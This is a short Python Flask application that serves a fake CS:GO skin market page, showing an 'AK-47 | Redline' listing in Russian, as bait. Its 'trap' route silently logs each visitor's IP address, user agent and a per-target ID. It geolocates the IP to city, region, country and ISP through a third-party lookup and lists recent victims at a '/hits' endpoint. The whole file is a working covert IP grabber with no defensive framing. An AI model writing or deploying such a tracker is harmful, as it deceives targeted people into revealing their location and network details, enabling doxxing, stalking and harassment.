import os, sqlite3, requests, json
from datetime import datetime
from flask import Flask, request, render_template_string

app = Flask(__name__)

DB_FILE = "hits.db"

def init_db():
    db = sqlite3.connect(DB_FILE)
    db.execute("""CREATE TABLE IF NOT EXISTS hits(
        ts TEXT, uid TEXT, ip TEXT, ua TEXT,
        city TEXT, region TEXT, country TEXT, isp TEXT)""")
    db.commit()
    return db

SKIN_PAGE = """
<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="utf-8">
<title>AK-47 | Redline — CS:GO Skins Market</title>
<style>
body{font-family:Arial;background:#1b2838;color:#c7d5e0;margin:0;padding:40px;text-align:center}
h1{color:#66c0f4;font-weight:400}
img{max-width:600px;border-radius:8px;box-shadow:0 4px 20px #0008}
.price{font-size:24px;color:#a4d007;margin-top:20px}
.btn{display:inline-block;margin-top:20px;padding:12px 32px;background:#5c7e10;color:#fff;text-decoration:none;border-radius:4px}
</style>
</head>
<body>
<h1>AK-47 | Redline (Field-Tested)</h1>
<img src="https://community.cloudflare.steamstatic.com/economy/image/-9aPaXzG3XfLcVxQ/360fx360f" alt="AK-47 Redline">
<div class="price">2 450 ₽</div>
<a class="btn" href="https://steamcommunity.com/market/">Купить на Steam Market</a>
</body>
</html>
"""

@app.route("/skin/<uid>")
def trap(uid):
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()
    ua = request.headers.get("User-Agent", "")

    city = region = country = isp = "—"
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?lang=ru", timeout=5).json()
        if r.get("status") == "success":
            city    = r.get("city", "—")
            region  = r.get("regionName", "—")
            country = r.get("country", "—")
            isp     = r.get("isp", "—")
    except Exception:
        pass

    db = init_db()
    db.execute("INSERT INTO hits VALUES (?,?,?,?,?,?,?,?)",
               (datetime.utcnow().isoformat(), uid, ip, ua,
                city, region, country, isp))
    db.commit()
    db.close()

    return render_template_string(SKIN_PAGE)

@app.route("/hits")
def hits():
    db = init_db()
    rows = db.execute("SELECT ts,uid,ip,ua,city,region,country,isp "
                      "FROM hits ORDER BY ts DESC LIMIT 50").fetchall()
    db.close()
    data = [dict(zip(["ts","uid","ip","ua","city","region","country","isp"], r))
            for r in rows]
    return json.dumps(data, ensure_ascii=False)

@app.route("/")
def home():
    return "OK", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)))
